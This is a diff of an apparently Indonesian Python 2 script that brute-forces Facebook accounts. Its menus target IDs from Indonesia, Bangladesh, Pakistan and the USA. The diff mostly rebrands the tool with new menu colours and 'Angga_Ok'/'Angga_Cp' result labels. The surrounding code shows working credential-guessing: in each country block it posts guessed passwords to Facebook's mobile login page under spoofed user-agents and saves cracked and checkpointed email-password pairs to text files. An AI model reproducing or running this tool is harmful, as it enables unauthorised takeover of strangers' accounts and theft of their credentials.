@@ -260,11 +260,11 @@ def crack_teman():
 	os.system("clear")
 	print (logo);time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;93m1.\033[0;97m Crack ID Indonesia');time.sleep(0.07)
-	print ('\033[0;93m2.\033[0;97m Crack ID Bangladesh');time.sleep(0.07)
-	print ('\033[0;93m3.\033[0;97m Crack ID Pakistan');time.sleep(0.07)
-	print ('\033[0;93m4.\033[0;97m Crack ID Usa');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack ID Indonesia');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack ID Bangladesh');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mCrack ID Pakistan');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m4\033[0;95m} \033[0;93mCrack ID Usa');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_teman()
 	
@@ -302,10 +302,10 @@ def crack_indo():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;96m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
-	print ('\033[0;96m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
-	print ('\033[0;96m3.\033[0;97m Crack Dari File');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack Dari Daftar Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack Dari Publik/Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mCrack Dari File');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_indo()
 
@@ -387,16 +387,16 @@ def pilih_indo():
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw
 				oke = open('done/indo.txt', 'a')
-				oke.write('\n[Berhasil] '+em+' ∆ '+pw)
+				oke.write('\n[Angga_Ok] '+em+' ∆ '+pw)
 				oke.close()
 				oks.append(em)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw
+					print '\033[0;96m[Angga_Cp]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw
 					cek = open('done/indo.txt', 'a')
-					cek.write('\n[Cekpoint] '+em+' ∆ '+pw)
+					cek.write('\n[Angga_Cp] '+em+' ∆ '+pw)
 					cek.close()
 					cekpoint.append(em)
 				else:
@@ -404,16 +404,16 @@ def pilih_indo():
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw2
 						oke = open('done/indo.txt', 'a')
-						oke.write('\n[Berhasil] '+em+' ∆ '+pw2)
+						oke.write('\n[Angga_Ok] '+em+' ∆ '+pw2)
 						oke.close()
 						oks.append(em)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw2
+							print '\033[0;96m[Angga_Cp]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw2
 							cek = open('done/indo.txt', 'a')
-							cek.write('\n[Cekpoint] '+em+' ∆ '+pw2)
+							cek.write('\n[Angga_Cp] '+em+' ∆ '+pw2)
 							cek.close()
 							cekpoint.append(em)
 						else:
@@ -421,16 +421,16 @@ def pilih_indo():
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw3
 								oke = open('done/indo.txt', 'a')
-								oke.write('\n[Berhasil] '+em+' ∆ '+pw3)
+								oke.write('\n[Angga_Ok] '+em+' ∆ '+pw3)
 								oke.close()
 								oks.append(em)
 							else:
 								if 'checkpoint' in xo:
-									print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw3
+									print '\033[0;96m[Angga_Cp]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw3
 									cek = open('done/indo.txt', 'a')
-									cek.write('\n[Cekpoint] '+em+' ∆ '+pw3)
+									cek.write('\n[Angga_Cp] '+em+' ∆ '+pw3)
 									cek.close()
 									cekpoint.append(em)
 								else:
@@ -438,16 +438,16 @@ def pilih_indo():
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pw4
 										oke = open('done/indo.txt', 'a')
-										oke.write('\n[Berhasil] '+em+' ∆ '+pw4)
+										oke.write('\n[Angga_Ok] '+em+' ∆ '+pw4)
 										oke.close()
 										oks.append(em)
 									else:
 										if 'checkpoint' in xo:
-											print '\033[0;96m[Cekpoint]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw4
+											print '\033[0;96m[Angga_Cp]\033[0;97m '+em+' \033[0;96m∆\033[0;97m '+pw4
 											cek = open('done/indo.txt', 'a')
-											cek.write('\n[Cekpoint] '+em+' ∆ '+pw4)
+											cek.write('\n[Angga_Cp] '+em+' ∆ '+pw4)
 											cek.close()
 											cekpoint.append(em)
 		except:
@@ -460,7 +460,7 @@ def pilih_indo():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;96mCP \033[0;96mfile tersimpan \033[0;91m: \033[0;92mdone/indo.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;96mKembali\033[0;97m >")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 	
 #### CRACK BANGLADESH ####
 def crack_bangla():
@@ -476,10 +476,10 @@ def crack_bangla():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;94m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
-	print ('\033[0;94m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
-	print ('\033[0;94m3.\033[0;97m Crack Dari File');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack Dari Daftar Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack Dari Publik/Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mCrack Dari File');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_bangla()
 
@@ -561,16 +561,16 @@ def pilih_bangla():
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz
 				oke = open('done/bangla.txt', 'a')
-				oke.write('\n[Berhasil] '+em+' ∆ '+pz)
+				oke.write('\n[Angga_Ok] '+em+' ∆ '+pz)
 				oke.close()
 				oks.append(em)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz
+					print '\033[0;94m[Angga_Cp]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz
 					cek = open('done/bangla.txt', 'a')
-					cek.write('\n[Cekpoint] '+em+' ∆ '+pz)
+					cek.write('\n[Angga_Cp] '+em+' ∆ '+pz)
 					cek.close()
 					cekpoint.append(em)
 				else:
@@ -578,16 +578,16 @@ def pilih_bangla():
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz2
 						oke = open('done/bangla.txt', 'a')
-						oke.write('\n[Berhasil] '+em+' ∆ '+pz2)
+						oke.write('\n[Angga_Ok] '+em+' ∆ '+pz2)
 						oke.close()
 						oks.append(em)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz2
+							print '\033[0;94m[Angga_Cp]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz2
 							cek = open('done/bangla.txt', 'a')
-							cek.write('\n[Cekpoint] '+em+' ∆ '+pz2)
+							cek.write('\n[Angga_Cp] '+em+' ∆ '+pz2)
 							cek.close()
 							cekpoint.append(em)
 						else:
@@ -595,16 +595,16 @@ def pilih_bangla():
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz3
 								oke = open('done/bangla.txt', 'a')
-								oke.write('\n[Berhasil] '+em+' ∆ '+pz3)
+								oke.write('\n[Angga_Ok] '+em+' ∆ '+pz3)
 								oke.close()
 								oks.append(em)
 							else:
 								if 'checkpoint' in xo:
-									print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz3
+									print '\033[0;94m[Angga_Cp]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz3
 									cek = open('done/bangla.txt', 'a')
-									cek.write('\n[Cekpoint] '+em+' ∆ '+pz3)
+									cek.write('\n[Angga_Cp] '+em+' ∆ '+pz3)
 									cek.close()
 									cekpoint.append(em)
 								else:
@@ -612,16 +612,16 @@ def pilih_bangla():
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pz4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+pz4
 										oke = open('done/bangla.txt', 'a')
-										oke.write('\n[Berhasil] '+em+' ∆ '+pz4)
+										oke.write('\n[Angga_Ok] '+em+' ∆ '+pz4)
 										oke.close()
 										oks.append(em)
 									else:
 										if 'checkpoint' in xo:
-											print '\033[0;94m[Cekpoint]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz4
+											print '\033[0;94m[Angga_Cp]\033[0;97m '+em+' \033[0;94m∆\033[0;97m '+pz4
 											cek = open('done/bangla.txt', 'a')
-											cek.write('\n[Cekpoint] '+em+' ∆ '+pz4)
+											cek.write('\n[Angga_Cp] '+em+' ∆ '+pz4)
 											cek.close()
 											cekpoint.append(em)
 		except:
@@ -634,7 +634,7 @@ def pilih_bangla():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;94mCP \033[0;94mfile tersimpan \033[0;91m: \033[0;92mdone/bangla.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;94mKembali\033[0;97m >")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 	
 #### CRACK PAKISTAN ####
 def crack_pakis():
@@ -650,10 +650,10 @@ def crack_pakis():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;90m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
-	print ('\033[0;90m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
-	print ('\033[0;90m3.\033[0;97m Crack Dari File');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack Dari Daftar Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack Dari Publik/Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mCrack Dari File');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_pakis()
 
@@ -735,16 +735,16 @@ def pilih_pakis():
 			rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xs = rep.content
 			if 'mbasic_logout_button' in xs or 'save-device' in xs:
-				print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb
 				oke = open('done/pakis.txt', 'a')
-				oke.write('\n[Berhasil] '+ef+' ∆ '+pb)
+				oke.write('\n[Angga_Ok] '+ef+' ∆ '+pb)
 				oke.close()
 				oks.append(ef)
 			else :
 				if 'checkpoint' in xs:
-					print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb
+					print '\033[0;90m[Angga_Cp]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb
 					cek = open('done/pakis.txt', 'a')
-					cek.write('\n[Cekpoint] '+ef+' ∆ '+pb)
+					cek.write('\n[Angga_Cp] '+ef+' ∆ '+pb)
 					cek.close()
 					cekpoint.append(ef)
 				else:
@@ -752,16 +752,16 @@ def pilih_pakis():
 					rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xs = rep.content
 					if 'mbasic_logout_button' in xs or 'save-device' in xs:
-						print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb2
 						oke = open('done/pakis.txt', 'a')
-						oke.write('\n[Berhasil] '+ef+' ∆ '+pb2)
+						oke.write('\n[Angga_Ok] '+ef+' ∆ '+pb2)
 						oke.close()
 						oks.append(ef)
 					else:
 						if 'checkpoint' in xs:
-							print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb2
+							print '\033[0;90m[Angga_Cp]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb2
 							cek = open('done/pakis.txt', 'a')
-							cek.write('\n[Cekpoint] '+ef+' ∆ '+pb2)
+							cek.write('\n[Angga_Cp] '+ef+' ∆ '+pb2)
 							cek.close()
 							cekpoint.append(ef)
 						else:
@@ -769,16 +769,16 @@ def pilih_pakis():
 							rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xs = rep.content
 							if 'mbasic_logout_button' in xs or 'save-device' in xs:
-								print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb3
 								oke = open('done/pakis.txt', 'a')
-								oke.write('\n[Berhasil] '+ef+' ∆ '+pb3)
+								oke.write('\n[Angga_Ok] '+ef+' ∆ '+pb3)
 								oke.close()
 								oks.append(ef)
 							else:
 								if 'checkpoint' in xs:
-									print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb3
+									print '\033[0;90m[Angga_Cp]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb3
 									cek = open('done/pakis.txt', 'a')
-									cek.write('\n[Cekpoint] '+ef+' ∆ '+pb3)
+									cek.write('\n[Angga_Cp] '+ef+' ∆ '+pb3)
 									cek.close()
 									cekpoint.append(ef)
 								else:
@@ -786,16 +786,16 @@ def pilih_pakis():
 									rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xs = rep.content
 									if 'mbasic_logout_button' in xs or 'save-device' in xs:
-										print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb4
 										oke = open('done/pakis.txt', 'a')
-										oke.write('\n[Berhasil] '+ef+' ∆ '+pb4)
+										oke.write('\n[Angga_Ok] '+ef+' ∆ '+pb4)
 										oke.close()
 										oks.append(ef)
 									else:
 										if 'checkpoint' in xs:
-											print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb4
+											print '\033[0;90m[Angga_Cp]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb4
 											cek = open('done/pakis.txt', 'a')
-											cek.write('\n[Cekpoint] '+ef+' ∆ '+pb4)
+											cek.write('\n[Angga_Cp] '+ef+' ∆ '+pb4)
 											cek.close()
 											cekpoint.append(ef)
 										else:
@@ -803,16 +803,16 @@ def pilih_pakis():
 											rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 											xs = rep.content
 											if 'mbasic_logout_button' in xs or 'save-device' in xs:
-												print '\033[0;92m[Berhasil]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb5
+												print '\033[0;92m[Angga_Ok]\033[0;97m '+ef+' \033[0;92m∆ \033[0;97m'+pb5
 												oke = open('done/pakis.txt', 'a')
-												oke.write('\n[Berhasil] '+ef+' ∆ '+pb5)
+												oke.write('\n[Angga_Ok] '+ef+' ∆ '+pb5)
 												oke.close()
 												oks.append(ef)
 											else:
 												if 'checkpoint' in xs:
-													print '\033[0;90m[Cekpoint]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb5
+													print '\033[0;90m[Angga_Cp]\033[0;97m '+ef+' \033[0;90m∆\033[0;97m '+pb5
 													cek = open('done/pakis.txt', 'a')
-													cek.write('\n[Cekpoint] '+ef+' ∆ '+pb5)
+													cek.write('\n[Angga_Cp] '+ef+' ∆ '+pb5)
 													cek.close()
 													cekpoint.append(ef)
 		except:
@@ -825,7 +825,7 @@ def pilih_pakis():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;90mCP \033[0;90mfile tersimpan \033[0;91m: \033[0;92mdone/pakis.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;90mKembali\033[0;97m >")
-	os.system("python2 crack-2.py")
+	os.system("python2 PRO_V21.py")
 
 #### CRACK USA ####
 def crack_usa():
@@ -841,10 +841,10 @@ def crack_usa():
 	os.system('clear')
 	print logo
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
-	print ('\033[0;95m1.\033[0;97m Crack Dari Daftar Teman');time.sleep(0.07)
-	print ('\033[0;95m2.\033[0;97m Crack Dari Publik/Teman');time.sleep(0.07)
-	print ('\033[0;95m3.\033[0;97m Crack Dari File');time.sleep(0.07)
-	print ('\033[0;91m0.\033[0;97m Kembali');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m1\033[0;95m} \033[0;93mCrack Dari Daftar Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m2\033[0;95m} \033[0;93mCrack Dari Publik/Teman');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m3\033[0;95m} \033[0;93mCrack Dari File');time.sleep(0.07)
+	print ('\033[0;95m{\033[0;96m0\033[0;95m} \033[0;93mKembali');time.sleep(0.07)
 	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
 	pilih_usa()
 
@@ -926,16 +926,16 @@ def pilih_usa():
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px
+				print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px
 				oke = open('done/usa.txt', 'a')
-				oke.write('\n[Berhasil] '+em+' ∆ '+px)
+				oke.write('\n[Angga_Ok] '+em+' ∆ '+px)
 				oke.close()
 				oks.append(em)
 			else :
 				if 'checkpoint' in xo:
-					print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px
+					print '\033[0;95m[Angga_Cp]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px
 					cek = open('done/usa.txt', 'a')
-					cek.write('\n[Cekpoint] '+em+' ∆ '+px)
+					cek.write('\n[Angga_Cp] '+em+' ∆ '+px)
 					cek.close()
 					cekpoint.append(em)
 				else:
@@ -943,16 +943,16 @@ def pilih_usa():
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px2
+						print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px2
 						oke = open('done/usa.txt', 'a')
-						oke.write('\n[Berhasil] '+em+' ∆ '+px2)
+						oke.write('\n[Angga_Ok] '+em+' ∆ '+px2)
 						oke.close()
 						oks.append(em)
 					else:
 						if 'checkpoint' in xo:
-							print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px2
+							print '\033[0;95m[Angga_Cp]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px2
 							cek = open('done/usa.txt', 'a')
-							cek.write('\n[Cekpoint] '+em+' ∆ '+px2)
+							cek.write('\n[Angga_Cp] '+em+' ∆ '+px2)
 							cek.close()
 							cekpoint.append(em)
 						else:
@@ -960,16 +960,16 @@ def pilih_usa():
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px3
+								print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px3
 								oke = open('done/usa.txt', 'a')
-								oke.write('\n[Berhasil] '+em+' ∆ '+px3)
+								oke.write('\n[Angga_Ok] '+em+' ∆ '+px3)
 								oke.close()
 								oks.append(em)
 							else:
 								if 'checkpoint' in xo:
-									print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px3
+									print '\033[0;95m[Angga_Cp]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px3
 									cek = open('done/usa.txt', 'a')
-									cek.write('\n[Cekpoint] '+em+' ∆ '+px3)
+									cek.write('\n[Angga_Cp] '+em+' ∆ '+px3)
 									cek.close()
 									cekpoint.append(em)
 								else:
@@ -977,16 +977,16 @@ def pilih_usa():
 									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
 									xo = rex.content
 									if 'mbasic_logout_button' in xo or 'save-device' in xo:
-										print '\033[0;92m[Berhasil]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px4
+										print '\033[0;92m[Angga_Ok]\033[0;97m '+em+' \033[0;92m∆ \033[0;97m'+px4
 										oke = open('done/usa.txt', 'a')
-										oke.write('\n[Berhasil] '+em+' ∆ '+px4)
+										oke.write('\n[Angga_Ok] '+em+' ∆ '+px4)
 										oke.close()
 										oks.append(em)
 									else:
 										if 'checkpoint' in xo:
-											print '\033[0;95m[Cekpoint]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px4
+											print '\033[0;95m[Angga_Cp]\033[0;97m '+em+' \033[0;95m∆\033[0;97m '+px4
 											cek = open('done/usa.txt', 'a')
-											cek.write('\n[Cekpoint] '+em+' ∆ '+px4)
+											cek.write('\n[Angga_Cp] '+em+' ∆ '+px4)
 											cek.close()
 											cekpoint.append(em)
 		except:
@@ -999,7 +999,7 @@ def pilih_usa():
 	print '\033[0;91m• \033[0;92mOK\033[0;97m/\x1b[0;95mCP \033[0;95mfile tersimpan \033[0;91m: \033[0;92mdone/usa.txt'
 	print 50* "\033[0;93m─"
 	raw_input("\033[0;97m< \033[0;95mKembali\033[0;97m >")
